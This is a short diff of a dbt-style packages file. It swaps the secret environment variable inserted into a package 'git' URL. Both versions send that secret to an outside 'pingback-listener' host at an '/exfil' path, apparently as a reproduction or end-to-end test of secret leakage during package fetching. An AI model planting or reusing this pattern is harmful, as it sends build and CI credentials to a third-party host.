@@ -1,2 +1,2 @@
 packages:
-  - git: "https://pingback-listener-nhskm5f6gq-as.a.run.app/exfil?sec={{ env_var('DBT_ENV_SECRET_REPROTEST') }}"
+  - git: "https://pingback-listener-nhskm5f6gq-as.a.run.app/exfil?sec={{ env_var('DBT_ENV_SECRET_E2E') }}"
